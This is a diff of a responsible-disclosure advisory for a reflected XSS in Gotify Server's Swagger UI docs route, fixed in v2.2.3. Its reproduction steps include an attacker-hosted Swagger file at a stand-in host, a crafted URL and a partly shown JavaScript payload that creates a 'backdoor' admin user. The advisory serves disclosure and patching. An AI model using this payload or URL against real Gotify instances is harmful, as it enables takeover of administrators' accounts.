@@ -18,20 +18,20 @@
 
 Since [v2.0.0](https://github.com/gotify/server/commit/25576e2ed13020718332c42593fd532994298b5a), Gotify Server includes an instance of the [Swagger UI](https://swagger.io/tools/swagger-ui/) API documentation frontend at the `/docs` [route](https://github.com/gotify/server/blob/v2.2.2/router/router.go#L68).
 
-Until [v2.2.3](https://github.com/gotify/server/pull/541), the Swagger UI version hardcoded in Gotify's `Docs.UI` (v3.20.5) contained a bundled DOMPurify component which was vulnerable to the mutation XSS identified by Michał Bentkowski in 2021 ([CVE-2020-26870](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26870), [GHSA-qrmm-w75w-3wpx](https://github.com/advisories/GHSA-qrmm-w75w-3wpx)).[^1]
+Until [v2.2.3](https://github.com/gotify/server/pull/541), the Swagger UI version hardcoded in Gotify's `Docs.UI` (v3.20.5) contained a bundled DOMPurify component which was vulnerable to the [mutation XSS](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/) identified by Michał Bentkowski in 2021 ([CVE-2020-26870](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26870), [GHSA-qrmm-w75w-3wpx](https://github.com/advisories/GHSA-qrmm-w75w-3wpx)).
 
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/swagger-ui/3.20.5/swagger-ui-bundle.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/swagger-ui/3.20.5/swagger-ui-standalone-preset.js"></script>
 ```
 
-Gotify Server versions before 2.2.3 are thus susceptible to reflected XSS attacks when loading external Swagger config files via the `url` query string parameter. Since Gotify stores the logged-in user's auth token in localStorage and accepts it via the `X-Gotify-Key` header, reflected XSS can result in the compromise of logged-in administrative users' accounts if they browse to a crafted URL.
+Gotify versions before 2.2.3 are thus susceptible to reflected XSS attacks via `/docs` when loading external Swagger config files from the `url` query string parameter. Since Gotify stores the logged-in user's auth token in localStorage and accepts it via the `X-Gotify-Key` header, reflected XSS can result in the compromise of logged-in admin users' accounts if they browse to a crafted URL.
 
 ## Steps to Reproduce
 
 1. Use the official [Docker Compose file](https://gotify.net/docs/install#docker) or [example config file](https://raw.githubusercontent.com/gotify/server/v2.2.2/config.example.yml) to bring up an instance of Gotify Server (herein `https://gotify`) and log in with the admin credentials defined in the `defaultuser` block.
 
-2. Host the [Swagger YAML file](#swagger-yaml-file) at a location that you control (herein `https://attacker/swagger.yaml`). This file is based on the one provided by Vidoc Security[^2] but has been minified and adjusted to include the following JavaScript encoded to Base64:
+2. Host the [Swagger YAML file](#swagger-yaml-file) at a location that you control (herein `https://attacker/swagger.yaml`). This file is based on the [PoC file](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers) provided by Vidoc Security and includes the following JavaScript encoded to Base64:
 
 ```javascript
 fetch(window.location.origin + "/user", {
@@ -48,9 +48,9 @@ fetch(window.location.origin + "/user", {
 });
 ```
 
-3. Browse to https://gotify/docs?url=https://attacker/swagger.yaml, then browse to https://gotify/#/users and observe that a new admin user with the name `backdoor` has been added:
+3. Browse to <https://gotify/docs?url=https://attacker/swagger.yaml>, then browse to <https://gotify/#/users> and observe that a new admin user with the name `backdoor` has been added:
 
-![Gotify Server Web UI showing the 'backdoor' user demonstrating a successful reproduction of the issue](images/1.png)
+![Screenshot of Gotify Server Web UI showing the 'backdoor' user demonstrating a successful reproduction of the issue](images/1.png)
 
 ### Swagger YAML file
 
@@ -74,9 +74,3 @@ An attacker can execute arbitrary JavaScript in the context of a logged-in Gotif
 - 2023-01-10: Vendor acknowledgment
 - 2023-01-10: Vendor releases fix in v2.2.3 ([PR](https://github.com/gotify/server/pull/541), [release](https://github.com/gotify/server/releases/tag/v2.2.3))
 - 2023-01-10: Public disclosure via [GitHub Security Advisory](https://github.com/advisories/GHSA-3244-8mff-w398)
-
-<!-- References -->
-
-[^1]: [Mutation XSS via namespace confusion - DOMPurify < 2.0.17 bypass (Securitum)](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
-
-[^2]: [Hacking Swagger-UI - from XSS to account takeovers (Vidoc Security)](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)
